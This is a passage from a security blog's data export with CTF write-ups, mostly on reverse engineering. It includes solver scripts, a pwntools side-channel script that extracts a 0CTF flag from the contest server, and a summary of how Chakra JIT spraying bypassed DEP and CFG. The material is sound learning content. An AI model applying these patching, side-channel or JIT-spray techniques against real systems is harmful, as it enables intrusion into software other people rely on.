nini，22，ididnothavepet，拿回去餵 binary 就可以得到 flag 了。 更簡單的做法，把 cipher dump 出來做 frequency analysis 可以直接猜出 key。 MasterPiece這題與 Game 基本上就是不希望大家直接看整份 code ，其實有許多明顯的斷點可以讓你直接找到關鍵的 code 部分。 recon簡單試玩一下可以發現，應該是要畫出 flag 的樣子讓他彈出正確的訊息，否則他就會一直彈出 That is not the flag, that&#39;s your ugly ass的視窗，透過這個特點，我們可以用 ida 的 string 找到關鍵的 code 在 sub_140001220。 接下來就是看 code if ( v2 )&#123; v14 = QString::fromAscii_helper(&quot;Yes, that the flag !!&quot;, 21i64); ...&#125;else&#123; v13 = QString::fromAscii_helper(&quot;That is not the flag, that&#x27;s your ugly ass&quot;, 42i64); ...&#125; 往上看還有哪裡修改 v2，上面可能要花一點時間看，不過邊 google Qt 相關 function 邊看懂應該不是問題，source code 是長這樣： image.fill(qRgb(255, 255, 255));for( int row = 0 ; row &lt; image.height() ; row++)&#123; for( int col = 0 ; col &lt; image.width() ; col++)&#123; if( bitmap[row][col] != flag[row*image.width()+col])&#123; pass = false; break; &#125; &#125;&#125; flag 陣列就是 ida 中的 byte_14006B000，其實就是一堆 0 跟 1 而已，一個代表黑色一個代表白色，所以把 byte_14006B000 dump 出來就可以了，這裡有個問題就是，我們並不知道 image.height() 跟 image.width() 是什麼，不過這可以用 x64dbg 直接觀察結果，因為圖片的大小並不會改變。 solvesolve.py#!/usr/bin/env python3import numpy as npfrom PIL import Imageimport randomimport stringf = open(&quot;./flag.dump&quot;,&quot;r&quot;).read().split(&#x27;,&#x27;)w = 650h = 410arr = np.zeros([h,w])for i in range(h): for j in range(w): arr[i][j] = 255 if f[i*w+j] == &#x27;1&#x27; else 0img = Image.fromarray(np.uint8(arr),&quot;L&quot;)img.save(&quot;flag.png&quot;) Game這題與 MasterPiece 基本上就是不希望大家直接看整份 code ，其實有許多明顯的斷點可以讓你直接找到關鍵的 code 部分。 recon這邊使用 memory scan 的方式來找到關鍵的 code ，簡單遊玩幾次後可以發現，每殺死一個怪，地毯的顏色就會改變（錯過的怪將會直接遺失相關訊息，基本上每隻都應該要打到，不過還是可以用猜的），15*15格的地毯其實就類似跑馬燈，過了4關以後會發現怪的速度開始增加，我們先簡單掃描 score 的變化來找到存 score 的變數記憶體位置在哪： 然後接下來找是哪個 instruction 在修改 score： 最後 show assembly 來觀察其附近的邏輯： 這邊有個有趣的方法，因為我們知道我們現在處在的邏輯是 我打死了怪，我要增加 score 的 branch 當中，所以我們可以大膽猜測往前一點應該要有判斷是不是擊中的邏輯，當然也有可能這只是一個 add_score() 的函式，不過前面的code 很多，可以試試看，至於試試看的方法就是，手工 fuzz ，把跳轉的條件 nop 掉或是改成相反的判斷，例如 if(bullet.x &gt; enemy.x)&#123;a&#125;else&#123;b&#125; 組合語言可能就會是 jb，如果把 jb 改成 nop，那就永遠都會執行 &#123;a&#125; 部分的 code，重新嘗試幾次可以看到下面這部分的 code 是判斷子彈是否有打到怪： 把上圖的 jl 改成 nop 就可以全圖打怪了，不過我沒有打算這樣就給 flag，等到第四關的時候會變速，單純按著 space 來不及打完，會遺失很多的訊息，導致看不知道目前到底拚出了什麼單字，這時候我們要做的就是，去 ida 看我們剛剛找到的這些 code 附近到底還有什麼東西，有很多做法，把怪速度改成0慢慢打，把子彈改更快，把 flag 訊息復原直接畫圖等等，最簡單的就改速度。對應的位置在 ida 中的 sub_1400030F0()，這裡面有一些奇怪的東西，例如 LODWORD(v53) = rand() % 720;，亂改可以發現這個是生成的位置，或是 if ( (signed int)result &lt;= 3 ) v26 = 0.1;else v26 = 1.1; 亂改後可以發現這個是怪的速度，總之這邊就是看 code 的上下文，透過剛剛 recon 階段蒐集到的資訊，去比對每一段 code 大致上會是在處理什麼邏輯。基本上把速度改成 0 慢慢玩就會過了，因為預設還是希望大家把他弄快一點，所以 flag 長度有故意拉長，讓慢慢玩的人晚一點拿到 flag。避免大家覺得我豪洨，根本黑箱不出來，下面是 @segno 錄下來的解法： The `` tag is not supported by your browser. BigO1這題看 source code 應該就會恍然大悟了吧？總之這是超級超級超超級弱化版本了，這題來自 flare-on 2018 的其中一題，這題一直沒辦法用 gdb debug 的原因很簡單，我在 main 之前 ptrace 了整支程式，所以 gdb 要 ptrace 的時候就會被我寫的 ptrace 偵測到，這應該很好發現，因為有些被 print 出來的句子並沒有在 main 裡面被 print 出來。 這個 binary 要求你輸入 999 把 key，每次驗證完一把 key 後，就會把他 xor 一段寫死的 data array ， 999 輪後就把該 data array 印出來，所以可以知道我們要做的事情就是通過每個驗證，然後解出 flag，這裡需要逆向的是 binary 怎麼樣來驗證我們的 key 是不是正確的，然後因為我沒有做 code 段的加密，不然會太難，所以這個 binary 是 static link，不然馬上就可以發現旁邊有一些奇怪的 function 。 決定要怎麼驗證 flag 的 struct 如下 ： struct Check&#123; void (*func)() ; char* input; int offset; int chr_idx; int check_len; int verify[2];&#125; checker; func 是一個指向 verify_[1-5] 其中一個 function 的函式指標，不過這樣會變得太簡單，因為 ida 認得出來，所以我有幫他加上偏移，實際上他是 verify_[1-5]-offset，所以靜態分析得時候是不會被解析的，他會在執行的時候在 check()中重新計算真正的 function 在哪： checker.func = data[idx].func+checker.offset; 每把 key 的長度是 70byte ，每個驗證 function 會驗證其中的 1~2byte ，不會重複驗證驗證過的 byte，也就是每個 function 只會算出唯一解，不需要複雜的運算，總共只有 5 個驗證 function，去看 source code 吧，基本上是很簡單的運算， fibonacci 或是單純乘法或是單純 xor 而已。 所以要做的事情就是，復原 struct ，知道他打算驗證什麼，驗證哪幾 byte，對應的驗證函式是什麼。這題就先不公布解法的腳本了，留一題給大家當暑假作業，呵呵，這題難點就是逆向而已，腳本練習一下啊。不過算好的 key.txt 已經放在 github 上了，把 key 餵給 binary 的方法： cat key.txt | ./BigO1 ;done","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"}]},{"title":"2019::PlaidCTF","slug":"2019-PlaidCTF","date":"2019-05-01T13:50:47.000Z","updated":"2019-05-02T03:50:58.000Z","comments":true,"path":"en/2019-PlaidCTF/","permalink":"http://blog.terrynini.tw/en/2019-PlaidCTF/","excerpt":"Played with Balsn, and get 4th this time.I have to construct my payload more carefully, wasted too much time on debugging. This is not a writeup for reading, just a kind of reminder for myself.","text":"Played with Balsn, and get 4th this time.I have to construct my payload more carefully, wasted too much time on debugging. This is not a writeup for reading, just a kind of reminder for myself. Misc::space saverSolution1 binwalk --dd=&quot;.*&quot; space.dd formost would extract the same png, but missing the most important part !! The password of rar is concated after the keyword IEND of each png Solution2 mount the dd mount -o loop space.dd /mnt/tmp scan for searching deleted files Misc::can you guess meintuitive solutionalso my solution print(vars()) error basethis is interesting help(flag) intended solutionIt’s persuasive, because exec link Misc::Project EulerntFactor + random permutation and greedyThis should be more efficiency ？ Factor + dfsThis is the first thought came to my mind, did not find this solution on CTFtime’s wirteup.But the writeup released by team ranked 2nd and 3rd are this kind.","categories":[{"name":"Reminder","slug":"Reminder","permalink":"http://blog.terrynini.tw/categories/Reminder/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Plaid","slug":"Plaid","permalink":"http://blog.terrynini.tw/tags/Plaid/"}]},{"title":"TIL::攻擊LCG(線性同餘生成器)","slug":"TIL-攻擊LCG-線性同餘生成器","date":"2019-04-01T04:18:45.000Z","updated":"2019-04-01T13:24:28.000Z","comments":true,"path":"tw/TIL-攻擊LCG-線性同餘生成器/","permalink":"http://blog.terrynini.tw/tw/TIL-%E6%94%BB%E6%93%8ALCG-%E7%B7%9A%E6%80%A7%E5%90%8C%E9%A4%98%E7%94%9F%E6%88%90%E5%99%A8/","excerpt":"p4: https://tailcall.net/blog/cracking-randomness-lcgs/paper: https://www.pnas.org/content/pnas/61/1/25.full.pdf","text":"p4: https://tailcall.net/blog/cracking-randomness-lcgs/paper: https://www.pnas.org/content/pnas/61/1/25.full.pdf 實用方面，p4 提到，在 LCG 內部參數未知的情況時，獲取足夠的亂數輸出，可以逆算回推所有的參數。而 paper 提到，這種 LCG 所產生的亂數其實並沒有很亂，從產生的序列中抓固定長度的數字當做高維度的點，可以被證明其實這些高維度的點，會出現在為數不多的 hyperplane 上面，也就是說，憑 LCG 所做出來的蒙地卡羅方法可能不夠好，因為事實上這些亂數並不夠亂。","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"Cryptography","slug":"Cryptography","permalink":"http://blog.terrynini.tw/tags/Cryptography/"}]},{"title":"2019::0CTF::Quals::Sanitize","slug":"2019-0CTF-Quals-Sanitize","date":"2019-03-27T11:47:48.000Z","updated":"2019-03-27T13:07:54.000Z","comments":true,"path":"en/2019-0CTF-Quals-Sanitize/","permalink":"http://blog.terrynini.tw/en/2019-0CTF-Quals-Sanitize/","excerpt":"Play with Balsn this time and got 12th place, teamates are really amazing.I just slept late at the weekend…, there was only a reverse challenge left …Though, they release the sixology on the last day, we almost solve that, but I did not notice that the compare operation in the bubble sort is lexicographically….","text":"Play with Balsn this time and got 12th place, teamates are really amazing.I just slept late at the weekend…, there was only a reverse challenge left …Though, they release the sixology on the last day, we almost solve that, but I did not notice that the compare operation in the bubble sort is lexicographically…. TL;DRbinary search &#123;&#125;cmp_char_here3guess_position_here 4 47 flag&#123;fr0M_C0vEr4ge_To_Fl4G_And_Enj0Y_0cTF_2Ol9!&#125; detailThe binary expects us to input a string , and pick some characters from the flag string, then the binary would perform sorting on these characters. At the end of the binary, it prints out the record of it’s code coverage. Which means that we may recover the control flow of binary from these information which sounds difficult. And the key point is what kind of sorting was implemented in the binary. The below is the detail of the sorting implemented in the binary, take input as 123\\n3\\n1 2 5\\n for example, which means that take the char at flag[1],flag[2],flag[5], and sort these chars with string 123 together. (Newline would affect the code coverage) The user input 123 would be processed first, then the characters from flag string. And the phases of sorting can be summarize as follow : Build up a List Build a charObject which has sub_list,sub_list_len,char_value,next,parent Insert the charObject to the List base on the value of sub_list_len,which should initialize as0. If there were already some objects with 0 sub_list_len,the new object would be inserted at the tail of them (it’s actually not the length, just for convenience) Compare last two object at row of charObject with same sub_list_len value The bigger one would be put into the sublist of the other one Go back to 2. if there are still chars remaining. So, it look like input :12331 2 5#Assume that the flag at remote is &#x27;flag&#123;???????????&#125;&#x27;List -&gt; null List -&gt; &#x27;1&#x27;List -&gt; &#x27;1&#x27; -&gt; &#x27;2&#x27;List -&gt; &#x27;1&#x27; | &#x27;2&#x27; List -&gt; &#x27;3&#x27; -&gt; &#x27;1&#x27; | &#x27;2&#x27; List -&gt; &#x27;l&#x27; -&gt; &#x27;3&#x27; -&gt; &#x27;1&#x27; | &#x27;2&#x27; List -&gt; &#x27;3&#x27; -&gt; &#x27;1&#x27; | | &#x27;l&#x27; &#x27;2&#x27; List -&gt; &#x27;a&#x27; -&gt; &#x27;1&#x27; | &#x27;2&#x27; | &#x27;3&#x27; | &#x27;l&#x27; List -&gt; &#x27;a&#x27; -&gt; unknown_char -&gt; &#x27;1&#x27; | &#x27;2&#x27; | &#x27;3&#x27; | &#x27;l&#x27; At this point, the last char, which is flag[5] would be compare with char a, according to the result (&gt; or &lt;&#x3D;), the binary would give us two different code coverage, but the problem here is we can only compare the last char,flag[4] here, with the other char , flag[1] ==&#39;a&#39; here , which was also from flag string. If we change the order of the input slightly: 12335 1 2 Now we can compare the unknown char from string with our input, but the new problem is the code coverage is implemented by a bunch of counter, the flow after this compare may cause them looks the same. So we have to construct a string which make the binary branch predictable. That is : &#123;&#125;A35 4 47 The flag[4] and flag[47] are &#123; and &#125; respectively, this input make the path of sorting more predictable due to&#123; and &#125; are almost bigeer than all ascii. The fun fact here is the last char of flag is \\n. exploit12345678910111213141516171819202122232425262728293031from pwn import *import stringcontext.log_level =&#x27;error&#x27;charset = sorted(list(string.printable[:-5]))flag = []def bsearch(idx,pos): p = remote(&quot;111.186.63.16&quot;,20193) p.sendline(&quot;&#123;&#125;&quot;+charset[idx]) p.send(&quot;3\\n&quot;+str(k)+&quot;\\n4\\n47\\n&quot;) ret = p.recv() p.close() return retfor k in range(5,47): lower = 0 upper = len(charset)-1 l_st= bsearch(lower, k) u_st = bsearch(upper, k) while lower &lt; upper: mid = (lower+upper)/2 if (bsearch(mid,k) == l_st): lower = mid + 1 else: upper = mid flag.append(charset[lower-1]) print &quot;flag&#123;&quot;+&#x27;&#x27;.join(flag)+&quot;&#125;&quot;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"0CTF","slug":"0CTF","permalink":"http://blog.terrynini.tw/tags/0CTF/"}]},{"title":"TIL::利用 Chakra JIT 繞過 DEP 和 CFG","slug":"TIL-利用-Chakra-JIT-繞過-DEP-和-CFG","date":"2019-03-17T14:46:16.000Z","updated":"2019-03-17T16:18:24.000Z","comments":true,"path":"tw/TIL-利用-Chakra-JIT-繞過-DEP-和-CFG/","permalink":"http://blog.terrynini.tw/tw/TIL-%E5%88%A9%E7%94%A8-Chakra-JIT-%E7%B9%9E%E9%81%8E-DEP-%E5%92%8C-CFG/","excerpt":"原文","text":"原文 JIT Spray透過讓 JIT 編譯某些設計過的指令，在記憶體中構造出想要的 shellcode。 緩解的方法是利用隨機生成的 key 加密常數，而 Chakra 也會隨機插入指令。 上次一個高中生在 Chakra 上找到的洞有一部分也跟常數的加密有關，在某些時候其實 JIT 沒有真的隨機生成 key https://en.wikipedia.org/wiki/JIT_spraying CFG基本上就是將編譯後的 function 入口的記憶體位置壓縮成一個 bitmap 方便查表，如果在表上是1表示是可信賴的 function 入口，否則就當作是後來被惡意產生的。 實作細節 https://www.anquanke.com/post/id/85493 https://xz.aliyun.com/t/2587 原文摘要在 Chakra 中 JIT Spray 的防禦措施，是在常數大小大於 2 bytes 時才會作用，但是可以在陣列賦值的指令中把偏移也當作是 JIT Spray的一部份，因此繞過了 DEP。但是因為由此生成的 shellcode 入口並沒有被記錄在 CFG 表上，所以還是會被擋下來，而繞過的方法是，Chakra 本身在正常使用 JIT 的時候，一定會動態生成編譯好的 function ，那 Chakra 又是怎樣通過 CFG 的呢？ Chakra 透過一個早就寫好的 function 入口（所以有記錄在 CFG 表上）來跳到那些 JIT 動態編譯的 function 中，因此可以藉此跳板來跳到剛才 JIT Spray 構造的 shellcode 上。","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"browser","slug":"browser","permalink":"http://blog.terrynini.tw/tags/browser/"},{"name":"Chakra","slug":"Chakra","permalink":"http://blog.terrynini.tw/tags/Chakra/"},{"name":"JIT","slug":"JIT","permalink":"http://blog.terrynini.tw/tags/JIT/"}]},{"title":"2019::CONFidence","slug":"2019-CONFidence","date":"2019-03-17T12:55:13.000Z","updated":"2019-04-04T13:13:02.000Z","comments":true,"path":"en/2019-CONFidence/","permalink":"http://blog.terrynini.tw/en/2019-CONFidence/","excerpt":"Teaching CPR during the contest, so I decided to spend the next few day to sovle these challenges without looking writeups.","text":"Teaching CPR during the contest, so I decided to spend the next few day to sovle these challenges without looking writeups. Reverse::ElementaryTL;DRSolve this with angr is quick and easy solver.pyimport angrimport claripyf = open(&quot;./elementary&quot;,&quot;r&quot;).read()r = []a = 0find = 0x40077fwhile True: #find all the # mov eax,0 # jmp xxxxxx p = f.find(&quot;\\xB8\\x00\\x00\\x00\\x00\\xE9&quot;,a+1) if a == -1: break r.append(a+0x400000)p = angr.Project(&quot;./elementary&quot;)flag_chars = [claripy.BVS(&#x27;flag_%d&#x27; % i, 8) for i in range(104)]flag = claripy.Concat(*flag_chars)st = p.factory.blank_state(stdin=flag)simgr = p.factory.simgr(st)simgr.explore(avoid=tuple(r),find=find)print simgr.found[0].posix.dumps(0) flag:p4&#123;I_really_hope_you_automated_this_somehow_otherwise_it_might_be_a_bit_frustrating_to_do_this_manually&#125; detailsThe binary has lots of trivial functions, some of them return the arg1 directly, the others return arg1^1, this prevents us from parsing the decompile result directly. The angr help us to solve this challenge without knowing anything about those functions. The other option to solve this is to laverage idapython to parse the decompile result directly, I used to do so. Reverse::Old schoolpseudo codelogic.pydef sub_10148(): position = 0x50 for i in range(9): input = input(&quot;hex&quot;) input = int(input,16) # column direction if input &amp; 1 = 1 if position is 0 or position%18 != 16: #18 is the chars number in a row position += 1 if !(input &amp; 1) if position is not 0 or position%18 != 0: position -= 1 # row direction if input &amp; 2: if position &lt; 0x8f: #0xa1/18 is the total rows of the output position += 18 if !(input &amp; 2): position &gt; 17: position -= 18 input = input &gt;&gt; 2 # process next to bits of user input memory[position] +=1def sub_10215(): string = &quot;p4&#123;krule_ctf&#125;&quot; position = 0 for i in range(0xa1): if array[memory[position]] &gt; 0xd: bl = 0x5e else: bl = string[memory[position]+0xbc] memory[position] = bl position += 1 detailsThe binary ask for 18 hexadecimal digits to draw a graph. Every two of them will be consider as a number, eg: 1a &#x3D; $26_{10}$. Then, for each number, every two bits of them indicate a way to move on a 2D-array on memory. So, at the end of the funciton sub_10148, the data in 2D-array implys that how much times we walk on to a corresponding position. What sub_10215 does is replace the number in array to the corresponding character in string p4&#123;krule_ctf&#125;. And S and E in the flag.txt means the start point and the end point. In summary, all we need to do is to find a way to move from S to E and also satify all the numbers marked on each position. Backtracking is a good choice, but I drew it on paper. original-array 2 3211 1 3423 E 1 2213 1 2 1 SMy solution is : ↖↖↗↗ ↘↙↙↗ ↘↗↖↖ ↘↗↘↖ ↘↗↖↖ ↗↙↙↗ ↙↗↘↖ ↘↗↙↗ ↗↙↘↗ Hexadecimal solution is 50 6b 07 37 07 69 36 67 79 (there should be no space in input) Reverse::PudliszkidetailsThis challange gives us a .jar, after decompile, there is a package call kotlin inside it, it’s another language designed for JVM, I’ve never heard of it …, the result of decompiler looks like a mess …. , and there are some weird class like p.class,&#123;.class, &#125;.class. It’s obviously would be use to verify the flag later. Take a look on main first : FlagCheckerKt.classpublic final class FlagCheckerKt&#123; public static final void main(@NotNull String[] args) &#123; Intrinsics.checkParameterIsNotNull(args, &quot;args&quot;); String[] $receiver = args; int $i$a$-with-FlagCheckerKt$main$1 = 0; SizeResult localSizeResult = SizeResultFactory.Companion.check($receiver.length, A.class); if ((localSizeResult instanceof Correct)) &#123; String str1; if (validateFlag($receiver[0]) == 0) &#123; str1 = &quot;Nice!&quot;;System.out.print(str1); &#125; else &#123; str1 = &quot;Not today&quot;;System.out.print(str1); int i = -1;System.exit(i);throw ((Throwable)new RuntimeException(&quot;System.exit returned normally, while it was supposed to halt JVM.&quot;)); &#125; &#125; else if ((localSizeResult instanceof Incorrect)) &#123; String str2 = &quot;Failed&quot;;System.out.print(str2); int j = -1;System.exit(j);throw ((Throwable)new RuntimeException(&quot;System.exit returned normally, while it was supposed to halt JVM.&quot;)); &#125; &#125; SizeResult localSizeResult = SizeResultFactory.Companion.check($receiver.length, A.class);, this line checks the number of args equals to the length of the name of class A or not. Then, call validateFlag to verify the arg. The decompiled result of validFlag is a mess, need patience to read it, and try to write a couple lines of kotlin. Basically, what validFlag does is : Turn the flag into a list of tuple, eg: String &quot;abab&quot; -&gt; List [(a,0),(b,1),(a,2),(b,3)] Group the list from step 1 according to the first in each tuple, eg: List [(a,0),(b,1),(a,2),(b,3)] -&gt; LinkedHashMap &#123;a=[0,2],b=[1,3]&#125; Call checksum to do some caculation on the LinkedHashMap from step 2 Follow into the function checksum : Call compress to compress the list in LinkedHashMap. LinkedHashMap &#123;a=[0,2],b=[1,3]&#125; -&gt; Collection &#123;(a.class object instance, 0*1+2*32),(b,calss object instance, 1*1+3*32)&#125; Do some caculate according to the first of each tuple and append it to a temp Collection. Apply sum on the Collection and return the result, which should be 0 The caculate in step 2 is : localObject3 = Integer.valueOf(($i$a$-map-FlagCheckerKt$checksum$1 instanceof &#125;) ? ((Number)entry.getSecond()).intValue() - 27 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof _) ? ((Number)entry.getSecond()).intValue() - 19849 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof u) ? ((Number)entry.getSecond()).intValue() - 25 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof t) ? ((Number)entry.getSecond()).intValue() - 5 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof s) ? ((Number)entry.getSecond()).intValue() - 11 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof n) ? ((Number)entry.getSecond()).intValue() - 8 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof l) ? ((Number)entry.getSecond()).intValue() - 486 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof k) ? ((Number)entry.getSecond()).intValue() - 643 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof i) ? ((Number)entry.getSecond()).intValue() - 16 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof h) ? ((Number)entry.getSecond()).intValue() - 786 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof e) ? ((Number)entry.getSecond()).intValue() - 21 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof c) ? ((Number)entry.getSecond()).intValue() - 23 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 7) ? ((Number)entry.getSecond()).intValue() - 22 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 5) ? ((Number)entry.getSecond()).intValue() - 17 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 1) ? ((Number)entry.getSecond()).intValue() - 327 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 0) ? ((Number)entry.getSecond()).intValue() - 452 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof &#123;) ? ((Number)entry.getSecond()).intValue() - 2 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 4) ? ((Number)entry.getSecond()).intValue() - 1 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof p) ? ((Number)entry.getSecond()).intValue() - 27040 : 64199); Get the flag by factorizing those number. flag:p4&#123;k0tl1n_1s_p0li5h_ke7chup&#125; Reverse::WatchmemThe binary fork itself by createprocess, then it would try to act like a debugger. When the children return a singal single step or signal illegal instrution, it will decode the real instructions and put it back, and recover it after execution.It’s time comsuming to fully understand the mechanism, I try to analyze the pattern by hook WriteProcessMemory,which can be done by dll injection or debugger script. This is the snippet of result : 0x401e69 2 #patch 0x401e69 0x401e69+10xc9 0x8d #change the bytes to 0xc9 0x8d0x401e69 160x55 0x95 0xa9 0xbd 0x94 0x10 0xb1 0xe 0x8 0x28 0x96 0x55 0xca 0xb0 0xc3 0xb 0x401e69 160xc9 0x8d 0x31 0x9b 0x2a 0x56 0x57 0x12 0x7a 0xb0 0x72 0x15 0xfe 0x36 0x4d 0x4f 0x401e69 20xf 0xb0x401e6a 10x95 It turns out that the second records always be the decoded instruction. So, all we need to do is patch it by IDApython ida.pydef go_patch(patch): for i in patch: ea = int(i[0],16) p = i[1].split(&quot; &quot;) for k in range(len(p)): idc.PatchByte( ea+k , int(p[k],16))patch = [[&#x27; 00401E69&#x27;, &#x27;c9&#x27;], [&#x27; 00401E6A&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401E6C&#x27;, &#x27;83 ec 48&#x27;], [&#x27; 00401E6F&#x27;, &#x27;c7 04 24 cc a0 43 00&#x27;], [&#x27; 00401E76&#x27;, &#x27;e8 c9 4f 03 00 d5 23 64 9d e8 fa de 8d 34 9a 05&#x27;], [&#x27; 00436E44&#x27;, &#x27;&#x27;], [&#x27; 00401E7B&#x27;, &#x27;8d 45 d6&#x27;], [&#x27; 00401E7E&#x27;, &#x27;89 44 24 04&#x27;], [&#x27; 00401E82&#x27;, &#x27;c7 04 24 2f a1 43 00&#x27;], [&#x27; 00401E89&#x27;, &#x27;e8 ae 4f 03 00 d5 23 69 41 28 15 78 b0 58 4d 07&#x27;], [&#x27; 00436E3C&#x27;, &#x27;&#x27;], [&#x27; 00401E8E&#x27;, &#x27;a1 a8 d1 43 00&#x27;], [&#x27; 00401E93&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E96&#x27;, &#x27;e8 e9 4f 03 00 d5 23 64 9d 28 fa 9c c2 c1 9d cb&#x27;], [&#x27; 00436E84&#x27;, &#x27;&#x27;], [&#x27; 00401E9B&#x27;, &#x27;8d 45 d6&#x27;], [&#x27; 00401E9E&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401EA1&#x27;, &#x27;&#x27;], [&#x27; 00401E30&#x27;, &#x27;55&#x27;], [&#x27; 00401E31&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401E33&#x27;, &#x27;83 ec 28&#x27;], [&#x27; 00401E36&#x27;, &#x27;c7 45 f4 a8 a0 43 00&#x27;], [&#x27; 00401E3D&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401E40&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E43&#x27;, &#x27;&#x27;], [&#x27; 00401E09&#x27;, &#x27;55&#x27;], [&#x27; 00401E0A&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401E0C&#x27;, &#x27;83 ec 14&#x27;], [&#x27; 00401E0F&#x27;, &#x27;c7 45 fc 00 00 00 00&#x27;], [&#x27; 00401E16&#x27;, &#x27;eb 0f 8f a5 22 b9 26 d0 c0 60 3b e1 1f 55 fb d4&#x27;], [&#x27; 00401E27&#x27;, &#x27;83 7d fc 0f&#x27;], [&#x27; 00401E2B&#x27;, &#x27;&#x27;], [&#x27; 00401E18&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401E1B&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E1E&#x27;, &#x27;&#x27;], [&#x27; 00401DDF&#x27;, &#x27;55&#x27;], [&#x27; 00401DE0&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401DE2&#x27;, &#x27;83 ec 04&#x27;], [&#x27; 00401DE5&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401DE8&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401DEB&#x27;, &#x27;&#x27;], [&#x27; 00401C20&#x27;, &#x27;55&#x27;], [&#x27; 00401C21&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401C23&#x27;, &#x27;53&#x27;], [&#x27; 00401C24&#x27;, &#x27;83 ec 10&#x27;], [&#x27; 00401C27&#x27;, &#x27;c7 45 f4 10 a0 43 00&#x27;], [&#x27; 00401C2E&#x27;, &#x27;c7 45 f8 00 00 00 00&#x27;], [&#x27; 00401C35&#x27;, &#x27;eb 28 8f a5 32 b7 e5 ec a7 4c ab c4 92 d9 b1 d8&#x27;], [&#x27; 00401C5F&#x27;, &#x27;83 7d f8 1f&#x27;], [&#x27; 00401C63&#x27;, &#x27;&#x27;], [&#x27; 00401C37&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401C3A&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C3D&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401C3F&#x27;, &#x27;0f b6 18&#x27;], [&#x27; 00401C42&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401C45&#x27;, &#x27;8b 45 f4&#x27;], [&#x27; 00401C48&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401C4A&#x27;, &#x27;0f b6 08&#x27;], [&#x27; 00401C4D&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401C50&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C53&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401C55&#x27;, &#x27;31 cb&#x27;], [&#x27; 00401C57&#x27;, &#x27;89 da&#x27;], [&#x27; 00401C59&#x27;, &#x27;88 10&#x27;], [&#x27; 00401C5B&#x27;, &#x27;83 45 f8 01&#x27;], [&#x27; 00401C5F&#x27;, &#x27;0f 0b a6 5d a0 44&#x27;], [&#x27; 00401C65&#x27;, &#x27;90&#x27;], [&#x27; 00401C66&#x27;, &#x27;83 c4 10&#x27;], [&#x27; 00401C69&#x27;, &#x27;5b&#x27;], [&#x27; 00401C6A&#x27;, &#x27;5d&#x27;], [&#x27; 00401C6B&#x27;, &#x27;c3 17 83 53 05 e4 e8 8f 5f 0e 33 a0 6a 10 47 5f&#x27;], [&#x27; 00401DF0&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401DF3&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401DF6&#x27;, &#x27;&#x27;], [&#x27; 00401C6C&#x27;, &#x27;55&#x27;], [&#x27; 00401C6D&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401C6F&#x27;, &#x27;83 ec 10&#x27;], [&#x27; 00401C72&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C75&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401C78&#x27;, &#x27;88 45 fb&#x27;], [&#x27; 00401C7B&#x27;, &#x27;c7 45 fc 00 00 00 00&#x27;], [&#x27; 00401C82&#x27;, &#x27;eb 36 8f a5 2e b7 e5 ec a7 4c ab c4 aa a4 1e cc&#x27;], [&#x27; 00401CBA&#x27;, &#x27;83 7d fc 1e&#x27;], [&#x27; 00401CBE&#x27;, &#x27;&#x27;], [&#x27; 00401C84&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401C87&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C8A&#x27;, &#x27;01 d0&#x27;], [&#x27; 